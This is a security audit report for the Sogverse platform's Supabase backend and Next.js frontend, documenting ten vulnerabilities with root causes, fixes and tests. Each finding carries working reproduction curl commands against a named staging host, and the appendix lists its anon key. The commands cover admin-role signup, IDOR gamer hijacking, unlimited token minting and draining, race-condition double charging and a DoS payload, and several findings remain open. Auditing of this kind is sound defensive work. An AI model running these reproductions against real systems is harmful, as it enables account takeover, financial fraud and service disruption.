# Security Audit Report - Sogverse

**Date:** 2026-03-01
**Target:** sogverse-staging.sog.gg
**Supabase Project:** dbcozhkmfsczwgduizkg.supabase.co

---

## Executive Summary

| # | Vulnerability | Severity | Exploitability | Category | Status |
|---|---------------|----------|----------------|----------|--------|
| 1 | Admin Account Creation via Metadata | **CRITICAL** | Easy | Broken Access Control | **FIXED** |
| 2 | IDOR: Unauthorized Gamer Linking | **HIGH** | Easy | Broken Access Control | **FIXED** |
| 3 | Cron Race Condition (Double Charge) | **HIGH** | Medium | Concurrency | Open |
| 4 | Token Balance Race Condition | **HIGH** | Medium | Concurrency | **FIXED** |
| 5 | JSONB DoS via Expensive Casts | **HIGH** | Easy | Denial of Service | Open |
| 6 | Cron Function Public Access | **MEDIUM** | Easy | Broken Access Control | Open |
| 7 | Missing Security Headers | **MEDIUM** | N/A | Configuration | Open |
| 8 | GET-Based Signout CSRF | **MEDIUM** | Easy | CSRF | Open |
| 9 | LIKE Wildcard Injection | **LOW** | Medium | Input Validation | Open |
| 10 | `adjust_token_balance` Public RPC Access | **CRITICAL** | Easy | Broken Access Control | **FIXED** |

---

## Critical & High Severity Findings

### 1. Admin Account Creation via Metadata Manipulation — FIXED

**Severity:** CRITICAL
**Location:** `supabase/migrations/00001_create_profiles.sql:71-76`
**CWE:** CWE-287 (Improper Authentication)
**Fixed in:** Migration `00042_fix_handle_new_user_role_escalation.sql`, branch `fix/handle-new-user-role-escalation`
**Fixed date:** 2026-03-02

#### Description

The `handle_new_user()` PostgreSQL trigger trusts user-supplied metadata during registration to assign roles. While the frontend UI hardcodes `role: "customer"`, an attacker can call the Supabase Auth API directly with a crafted payload to create admin accounts.

#### Root Cause

```sql
-- Vulnerable code in handle_new_user() trigger
role_from_meta := NULLIF(NEW.raw_user_meta_data->>'role', '');
IF role_from_meta IS NOT NULL AND role_from_meta IN ('admin', 'customer', 'gamer', 'gedu') THEN
  profile_role := role_from_meta::user_role;  -- TRUSTS USER INPUT!
```

#### Reproduction

```bash
# Create admin account via direct API call
curl -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/auth/v1/signup" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -H "Origin: https://sogverse-staging.sog.gg" \
  -d '{
    "email": "attacker@evil.com",
    "password": "Password123!",
    "data": {
      "role": "admin",
      "display_name": "Attacker"
    }
  }'
```

#### Impact

- Full admin access to the application
- Ability to create gedu accounts, games, and products
- Access to all user data via admin RLS policies
- Token balance manipulation for any user
- Complete system compromise

#### Fix Applied

The trigger now **unconditionally assigns `customer`** to every new signup, ignoring `raw_user_meta_data->>'role'` entirely. All privileged roles are assigned via server-side promote pattern after user creation:

```sql
-- Migration 00042: handle_new_user() always assigns customer
CREATE OR REPLACE FUNCTION handle_new_user()
RETURNS TRIGGER AS $$
DECLARE
  profile_display_name TEXT;
BEGIN
  profile_display_name := COALESCE(NULLIF(NEW.raw_user_meta_data->>'display_name', ''), 'New User');

  INSERT INTO public.profiles (id, email, role, display_name)
  VALUES (NEW.id, NEW.email, 'customer', profile_display_name);

  INSERT INTO public.customer_profiles (user_id) VALUES (NEW.id);

  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER
SET search_path = public;
```

Role promotion is handled exclusively by server-side API routes using the service role key:

- **Gedu**: `POST /api/admin/create-gedu` (admin-only) — creates user as customer, then promotes to gedu and deletes the `customer_profiles` row.
- **Gamer**: `POST /api/gamers/create` (customer-only) — creates user as customer, then promotes to gamer, swaps extension tables, and links to the creating customer via `parent_gamer`.
- **Admin**: Created manually via Supabase dashboard only. No API route exists.

Additional defense layers:
- RLS policy `users_update_own_profile` has `WITH CHECK (role = get_user_role())` — users cannot change their own role via direct REST API calls.
- The `validate_parent_gamer_roles` trigger enforces that `parent_gamer` links can only reference users with `role = 'gamer'`.
- The `@gamer.sogverse.internal` email domain no longer grants gamer role — it only results in a customer account.

#### Verified attack vectors (all blocked)

1. Signup with `{"data": {"role": "admin"}}` — gets customer
2. Signup with `{"data": {"role": "gedu"}}` — gets customer
3. Signup with `{"data": {"role": "gamer"}}` — gets customer
4. Signup with `@gamer.sogverse.internal` email — gets customer
5. Direct REST API `PATCH /profiles` to change own role — blocked by RLS
6. Direct REST API `INSERT /parent_gamer` to hijack a gamer — separate issue (Finding #2)

#### Test coverage

6 DB integration tests in `tests/db/handle-new-user.test.ts` verify all escalation paths are blocked. CI passes.

---

### 2. IDOR: Unauthorized Gamer Linking — FIXED

**Severity:** HIGH
**Location:** `parent_gamer` table RLS policy
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
**Fixed in:** Migration `00044_fix_idor_parent_gamer_linking.sql`
**Fixed date:** 2026-03-02

#### Description

Any authenticated customer can link themselves as a parent to any gamer account, gaining full control over that gamer's enrollments and profile access.

#### Root Cause

The `parent_gamer` INSERT policy only validates `parent_id = auth.uid()`, not whether the user should have access to `gamer_id`.

#### Reproduction

```bash
# 1. Discover target gamer IDs from public enrollments
curl 'https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/group_enrollments?select=gamer_id&limit=10' \
  -H "Authorization: Bearer $TOKEN" \
  -H "apikey: $ANON_KEY"

# 2. Link yourself to any gamer
curl -X POST 'https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/parent_gamer' \
  -H "Authorization: Bearer $TOKEN" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{
    "parent_id": "YOUR_USER_ID",
    "gamer_id": "VICTIM_GAMER_ID",
    "relationship": "parent"
  }'

# 3. Access victim gamer's profile
curl "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/profiles?id=eq.$VICTIM_GAMER_ID&select=*" \
  -H "Authorization: Bearer $TOKEN" \
  -H "apikey: $ANON_KEY"
```

#### Impact

- View victim gamer's full profile
- Enroll/unenroll victim in products
- Spend tokens on victim's enrollments
- Remove victim from their legitimate parent's access

#### Fix Applied

Removed client-side INSERT access to `parent_gamer` entirely. The `customers_create_links` RLS policy was the sole INSERT path for authenticated users and lacked `gamer_id` authorization. All legitimate gamer linking already goes through the server-side `POST /api/gamers/create` route using the service role client (which bypasses RLS).

```sql
-- Migration 00044: remove client-side INSERT access
DROP POLICY IF EXISTS "customers_create_links" ON parent_gamer;
REVOKE INSERT ON parent_gamer FROM authenticated;
```

Dead client-side code (`GamerService.linkGamer()` and `useLinkGamer` hook) was also removed — neither was referenced by any component.

When multi-parent linking is needed in the future, it will be implemented as a server-side API route with proper authorization (e.g., invite codes or existing parent approval).

---

### 3. Cron Function Race Condition (Double Charge)

**Severity:** HIGH
**Location:** `process_enrollment_charges()` RPC
**CWE:** CWE-367 (Time-of-check Time-of-use Race Condition)

#### Description

Race condition in `process_enrollment_charges()` can cause customers to be charged multiple times for a single session while only one charge is recorded, leading to accounting discrepancies and financial harm.

#### Root Cause

```sql
-- process_enrollment_charges() lines 120-140
-- EXISTS check is not atomic with INSERT
-- Tokens are deducted BEFORE the UNIQUE constraint is checked
IF EXISTS (SELECT 1 FROM enrollment_charges WHERE ...) THEN CONTINUE; END IF;
-- Race window here
SELECT ... FROM adjust_token_balance(...);  -- Tokens deducted
INSERT INTO enrollment_charges (...);        -- UNIQUE violation caught here
```

#### Reproduction

```bash
# Trigger 50 parallel requests to the cron function
for i in {1..50}; do
  curl -s -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/rpc/process_enrollment_charges" \
    -H "authorization: Bearer $TOKEN" \
    -H "apikey: $ANON_KEY" &
done
wait

# Check for duplicate deductions
curl -s "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/token_transactions?select=*&type=eq.enrollment&order=created_at.desc&limit=20" \
  -H "authorization: Bearer $TOKEN" \
  -H "apikey: $ANON_KEY"
```

#### Impact

- Multiple token_transactions records with same enrollment
- Only one corresponding enrollment_charges record
- Customer balance deducted multiple times
- Financial harm and accounting discrepancies

#### Remediation

```sql
-- Use INSERT ... ON CONFLICT to make the check atomic
INSERT INTO enrollment_charges (enrollment_id, amount, transaction_id, session_date)
VALUES (v_rec.enrollment_id, v_rec.token_cost, v_tx_id, v_session_date)
ON CONFLICT (enrollment_id, session_date) DO NOTHING;

IF NOT FOUND THEN
  -- Another process already charged, skip token deduction
  CONTINUE;
END IF;

-- Only deduct tokens AFTER successful insert
SELECT ... FROM adjust_token_balance(...);
```

---

### 4. Token Balance Race Condition — FIXED

**Severity:** HIGH
**Location:** `adjust_token_balance()` RPC
**CWE:** CWE-367 (Time-of-check Time-of-use Race Condition)
**Fixed in:** Migration `00043_revoke_adjust_token_balance_public_access.sql`
**Fixed date:** 2026-03-02

#### Description

The `adjust_token_balance` RPC lacks row-level locking, allowing concurrent requests to cause inconsistent balances or overdrafts.

#### Root Cause

```sql
-- No SELECT FOR UPDATE before the UPDATE
UPDATE profiles
SET token_balance = token_balance + p_amount
WHERE id = p_user_id
RETURNING token_balance INTO v_new_balance;
```

#### Reproduction

```bash
# User has 10 tokens, product costs 8 tokens
# Send 3 concurrent enrollment requests - all may succeed

curl -X POST "https://sogverse-staging.sog.gg/api/enrollments" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"gamerId":"...","groupId":"..."}' &

curl -X POST "https://sogverse-staging.sog.gg/api/enrollments" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"gamerId":"...","groupId":"..."}' &

curl -X POST "https://sogverse-staging.sog.gg/api/enrollments" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"gamerId":"...","groupId":"..."}' &

wait
# Check balance - may be incorrect or negative
```

#### Impact

- Token balance corruption
- Free enrollments (overdraft)
- Financial loss

#### Remediation

```sql
CREATE OR REPLACE FUNCTION adjust_token_balance(...)
RETURNS TABLE(new_balance INTEGER, transaction_id UUID)
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_new_balance INTEGER;
  v_transaction_id UUID;
BEGIN
  -- Lock the row before updating to prevent race conditions
  SELECT token_balance INTO v_new_balance
  FROM profiles
  WHERE id = p_user_id
  FOR UPDATE;  -- ADD THIS LOCK

  UPDATE profiles
  SET token_balance = token_balance + p_amount
  WHERE id = p_user_id
  RETURNING token_balance INTO v_new_balance;

  INSERT INTO token_transactions (user_id, amount, type, description, stripe_session_id, stripe_subscription_id, currency)
  VALUES (p_user_id, p_amount, p_type, p_description, p_stripe_session_id, p_stripe_subscription_id, p_currency)
  RETURNING id INTO v_transaction_id;

  RETURN QUERY SELECT v_new_balance, v_transaction_id;
END;
$$;
```

#### Fix Applied

Migration `00043_revoke_adjust_token_balance_public_access.sql` adds `SELECT ... FOR UPDATE` row locking before the balance update, serializing concurrent modifications. Combined with the Finding #10 fix (REVOKE public access) in the same migration.

---

### 5. JSONB DoS via Expensive Type Casts

**Severity:** HIGH
**Location:** `commit_group_changes()` RPC
**CWE:** CWE-400 (Uncontrolled Resource Consumption)

#### Description

The `commit_group_changes()` RPC accepts JSONB arrays and performs type casts on each element without pre-validation. A small malicious payload with deeply nested or malformed data can trigger expensive error handling and type conversion operations, resulting in high amplification (few requests → significant resource consumption).

#### Root Cause

```sql
-- Direct cast without validation on each array element
(v_move->>'fromGroupId')::UUID  -- Throws on invalid input, expensive for large arrays
(v_move->>'gamerId')::UUID
(v_group->>'geduId')::UUID
```

Each failed cast triggers PostgreSQL's error handling path, which is significantly more expensive than a simple validation check. With large arrays, a single request can consume substantial CPU and memory.

#### Reproduction

```bash
# Single request with large array of invalid UUIDs
# Each element triggers expensive error handling
curl -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/rpc/commit_group_changes" \
  -H "authorization: Bearer $ADMIN_TOKEN" \
  -H "apikey: $APIKEY" \
  -H "content-type: application/json" \
  -d '{
    "p_product_id": "not-a-uuid",
    "p_added_groups": [
      {"geduId": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
      {"geduId": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},
      {"geduId": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"}
    ],
    "p_enrollment_moves": [
      {"fromGroupId": "x", "gamerId": "y"},
      {"fromGroupId": "x", "gamerId": "y"}
    ]
  }'
```

#### Impact

- High amplification: small request → expensive server-side processing
- Potential denial of service with few requests
- Database connection pool exhaustion
- Affects all users sharing the same database instance

#### Remediation

Add input validation before type casting to fail fast:

```sql
-- Validate UUIDs before expensive casting
CREATE OR REPLACE FUNCTION validate_uuid(p_value TEXT, p_field_name TEXT)
RETURNS UUID
LANGUAGE plpgsql
IMMUTABLE
AS $$
BEGIN
  IF p_value IS NULL THEN
    RETURN NULL;
  END IF;

  IF length(p_value) > 36 OR p_value !~ '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$' THEN
    RAISE EXCEPTION 'Invalid % format: expected UUID', p_field_name;
  END IF;

  RETURN p_value::UUID;
END;
$$;

-- Use in commit_group_changes:
v_product_id := validate_uuid(p_product_id, 'product_id');
```

Alternatively, add array length limits:

```sql
-- Limit array sizes to prevent abuse
IF jsonb_array_length(p_added_groups) > 100 THEN
  RAISE EXCEPTION 'Too many groups: maximum 100 allowed';
END IF;

IF jsonb_array_length(p_enrollment_moves) > 1000 THEN
  RAISE EXCEPTION 'Too many moves: maximum 1000 allowed';
END IF;
```

---

### 10. `adjust_token_balance` Public RPC Access (Unlimited Token Minting) — FIXED

**Severity:** CRITICAL
**Location:** `adjust_token_balance()` RPC, migration `00013_token_balance_and_transactions.sql:88`
**CWE:** CWE-284 (Improper Access Control)
**Fixed in:** Migration `00043_revoke_adjust_token_balance_public_access.sql`
**Fixed date:** 2026-03-02

#### Description

The `adjust_token_balance()` RPC is `SECURITY DEFINER` (bypasses RLS) and was granted to `authenticated` in migration 00013. No subsequent migration revokes this grant, and the function contains no `auth.uid()` check. Any authenticated user — customer, gamer, or gedu — can call it directly via `supabase.rpc()` to credit arbitrary token amounts to any user.

This is distinct from Finding #4 (race condition in the same function) and Finding #6 (public access on `process_enrollment_charges`). While Finding #6 leaks metrics, this finding allows **direct financial manipulation**.

#### Root Cause

```sql
-- Migration 00013: grants public access
GRANT EXECUTE ON FUNCTION adjust_token_balance TO authenticated;

-- No REVOKE in any subsequent migration
-- No auth.uid() check inside the function body
-- Function is SECURITY DEFINER — bypasses all RLS
```

Migration 00037 added `auth.uid()` guards to `enroll_gamer_in_group`, `unenroll_gamer`, and `get_customer_enrollments`, but `adjust_token_balance` was not included in that hardening pass.

#### Reproduction

```bash
# Any authenticated user can mint unlimited tokens for themselves (or anyone)
curl -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/rpc/adjust_token_balance" \
  -H "Authorization: Bearer $ANY_USER_TOKEN" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "p_user_id": "YOUR_USER_ID",
    "p_amount": 999999,
    "p_type": "purchase",
    "p_description": "Free tokens"
  }'

# Or credit tokens to any other user
curl -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/rpc/adjust_token_balance" \
  -H "Authorization: Bearer $ANY_USER_TOKEN" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "p_user_id": "VICTIM_USER_ID",
    "p_amount": -999999,
    "p_type": "admin_adjustment",
    "p_description": "Drain their balance"
  }'
```

#### Impact

- Any user can give themselves unlimited tokens (complete bypass of Stripe payment flow)
- Any user can drain another user's token balance to zero or negative (constrained only by CHECK constraint)
- Fake transaction records pollute the ledger with arbitrary types and descriptions
- Direct financial loss — tokens have real monetary value via Stripe purchases
- Complete undermining of the token economy

#### Remediation

Revoke the public grant. The function is only called from:
1. Server-side API routes using the admin/service-role client (`auth.uid()` is NULL) — Stripe webhook, admin adjust-tokens
2. Other `SECURITY DEFINER` RPCs (`enroll_gamer_in_group`, `unenroll_gamer`) — these call it internally, not via the PostgREST API

Neither caller needs the `authenticated` grant.

```sql
-- Revoke public access
REVOKE EXECUTE ON FUNCTION adjust_token_balance FROM authenticated;
REVOKE EXECUTE ON FUNCTION adjust_token_balance FROM anon;
REVOKE EXECUTE ON FUNCTION adjust_token_balance FROM public;
```

#### Fix Applied

Migration `00043_revoke_adjust_token_balance_public_access.sql` revokes `EXECUTE` from `authenticated`, `anon`, and `public`, and also adds `SELECT ... FOR UPDATE` row locking (Finding #4 fix) in a single migration.

DB test `tests/db/token-balance.test.ts` verifies that authenticated users receive a "permission denied" error when calling the RPC directly.

---

## Medium Severity Findings

### 6. Cron Function Public Access

**Severity:** MEDIUM
**Location:** `process_enrollment_charges()` RPC
**CWE:** CWE-284 (Improper Access Control)

#### Description

Any authenticated user can trigger the billing cron job, exposing aggregate business metrics (charged count, unenrolled count, error count).

#### Root Cause

PostgreSQL grants EXECUTE on new functions to PUBLIC by default. No explicit REVOKE exists for `process_enrollment_charges()`.

#### Reproduction

```bash
# Any authenticated user can call
curl -s -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/rpc/process_enrollment_charges" \
  -H "authorization: Bearer $TOKEN" \
  -H "apikey: $ANON_KEY"

# Response exposes business metrics:
# {"charged":5,"unenrolled":1,"errors":0,"processed_at":"..."}
```

#### Impact

- Information disclosure (business metrics)
- DoS by triggering cron repeatedly

#### Remediation

```sql
REVOKE EXECUTE ON FUNCTION process_enrollment_charges() FROM authenticated;
REVOKE EXECUTE ON FUNCTION process_enrollment_charges() FROM anon;
REVOKE EXECUTE ON FUNCTION process_enrollment_charges() FROM public;
-- Only allow pg_net or cron scheduler to call this
```

---

### 7. Missing Security Headers

**Severity:** MEDIUM
**Location:** `next.config.ts`
**CWE:** CWE-693 (Protection Mechanism Failure)

#### Description

`next.config.ts` has no security headers configured. While Vercel provides some defaults, critical headers are missing:
- `X-Frame-Options` (clickjacking protection)
- `Referrer-Policy` (prevents URL leakage)
- `Content-Security-Policy` (XSS defense-in-depth)

#### Impact

- Clickjacking: Site can be embedded in iframes for UI deception attacks
- Referrer leakage: Full URLs sent to third parties
- XSS surface: No CSP to limit script execution sources

#### Remediation

```typescript
// next.config.ts
import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          { key: "X-Frame-Options", value: "SAMEORIGIN" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          { key: "X-XSS-Protection", value: "1; mode=block" },
          {
            key: "Content-Security-Policy",
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://va.vercel-scripts.com",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: blob: https:",
              "font-src 'self' data:",
              "connect-src 'self' https://*.supabase.co https://api.stripe.com https://*.daily.co",
              "frame-src https://*.daily.co https://js.stripe.com https://hooks.stripe.com",
              "frame-ancestors 'self'",
            ].join("; "),
          },
          { key: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains" },
        ],
      },
    ];
  },
};

export default nextConfig;
```

---

### 8. GET-Based Signout CSRF

**Severity:** MEDIUM
**Location:** `src/app/api/auth/signout/route.ts`
**CWE:** CWE-352 (Cross-Site Request Forgery)

#### Description

The `/api/auth/signout` endpoint uses HTTP GET, which has a side effect (signing out the user). SameSite=Lax cookies allow cookies on top-level GET navigations, enabling forced logout attacks.

#### Reproduction

```html
<!-- Attacker creates malicious page -->
<a href="https://sogverse-staging.sog.gg/api/auth/signout">Click for free gift!</a>

<!-- Or auto-trigger -->
<script>window.location.href = "https://sogverse-staging.sog.gg/api/auth/signout";</script>
```

#### Impact

- Session disruption (forces logout)
- Annoyance attacks on users
- Could be combined with social engineering

#### Remediation

```typescript
// src/app/api/auth/signout/route.ts
import { NextResponse } from "next/server";
import { createClient } from "@/lib/supabase/server";

// Change from GET to POST
export async function POST(request: Request) {
  const { origin } = new URL(request.url());
  const supabase = await createClient();
  await supabase.auth.signOut();
  return NextResponse.json({ success: true });
}

// Add GET handler that returns 405
export async function GET() {
  return NextResponse.json({ error: "Method not allowed" }, { status: 405 });
}
```

```typescript
// src/providers/auth-provider.tsx - Update signout handler
const handleSignOut = async () => {
  await fetch("/api/auth/signout", { method: "POST" });
  window.location.href = "/";
};
```

---

## Low Severity Findings

### 9. LIKE Wildcard Injection in Search

**Severity:** LOW
**Location:** `src/services/users/users.service.ts:66`, `src/services/products/products.service.ts:89`
**CWE:** CWE-1426 (Improper Validation of Syntactic Elements)

#### Description

Search queries interpolate user input directly into ILIKE patterns without escaping SQL wildcards (`%`, `_`).

#### Reproduction

```javascript
// User searches for: a%
// Matches ANY email starting with 'a', bypassing exact match intent

// In browser console:
fetch('/api/users?search=%')
  .then(r => r.json())
  .then(console.log)  // Returns more results than expected
```

#### Impact

- Information disclosure (broad search results)
- Not SQL injection (parameterized queries prevent this)
- Low business impact

#### Remediation

```typescript
// Add wildcard escaping utility
function escapeLikePattern(str: string): string {
  return str.replace(/[%_\\]/g, '\\$&');
}

// In search functions:
const escapedQuery = escapeLikePattern(query);
.or(`email.ilike.%${escapedQuery}%,username.ilike.%${escapedQuery}%,display_name.ilike.%${escapedQuery}%`)
```

---

## Remediation Priority Matrix

| Priority | Finding | Effort | Risk Reduction | Status |
|----------|---------|--------|----------------|--------|
| **P0** | Admin Account Creation | 1h | Eliminates complete system compromise | **FIXED** |
| **P0** | `adjust_token_balance` Public Access | 15min | Prevents unlimited token minting | **FIXED** |
| **P0** | IDOR Gamer Linking | 2h | Prevents account hijacking | **FIXED** |
| **P1** | Cron Race Condition | 2h | Prevents financial harm | Open |
| **P1** | Token Balance Race | 1h | Prevents overdrafts | **FIXED** |
| **P1** | JSONB DoS | 2h | Prevents resource exhaustion | Open |
| **P2** | Cron Public Access | 15min | Prevents info disclosure | Open |
| **P2** | Security Headers | 30min | Defense-in-depth | Open |
| **P2** | Signout CSRF | 15min | Eliminates forced logout attacks | Open |
| **P3** | LIKE Wildcard | 30min | Prevents broad searches | Open |

---

## Testing Verification

After applying fixes, verify:

1. **Admin Account Creation** — **VERIFIED**
   ```bash
   # All of these create customer accounts (verified by CI tests):
   # - Signup with role: "admin" in user_metadata → customer
   # - Signup with role: "gedu" in user_metadata → customer
   # - Signup with role: "gamer" in user_metadata → customer
   # - Signup with @gamer.sogverse.internal email → customer
   # See: tests/db/handle-new-user.test.ts (6 passing tests)
   ```

2. **IDOR Gamer Linking** — **VERIFIED**
   ```bash
   # Authenticated customer INSERT into parent_gamer now returns "permission denied"
   # All linking goes through server-side /api/gamers/create (service role client)
   curl -X POST ".../rest/v1/parent_gamer" -d '{"parent_id":"...","gamer_id":"..."}'
   # Returns: 403 permission denied for table parent_gamer
   ```

3. **Cron Race Condition**
   ```bash
   # Parallel requests should not cause duplicate charges
   for i in {1..10}; do curl -X POST ".../rpc/process_enrollment_charges" & done; wait
   # Check token_transactions for duplicates
   ```

4. **Signout CSRF**
   ```bash
   curl https://your-domain.com/api/auth/signout
   # Should return 405 Method Not Allowed
   curl -X POST https://your-domain.com/api/auth/signout
   # Should successfully log out
   ```

5. **Security Headers**
   ```bash
   curl -I https://your-domain.com
   # Verify X-Frame-Options, Content-Security-Policy present
   ```

6. **Online Scanner**
   - Use https://securityheaders.com to verify headers

---

## Appendix: Credential Reference

| Item | Value |
|------|-------|
| Website | https://sogverse-staging.sog.gg |
| Supabase API | https://dbcozhkmfsczwgduizkg.supabase.co |
| Anon Key | `sb_publishable_uO_aAg7bRDNOLnOBA8L4rg_3XSA2vDx` |

*Note: The anon key is public (embedded in frontend) and listed here for documentation purposes.*
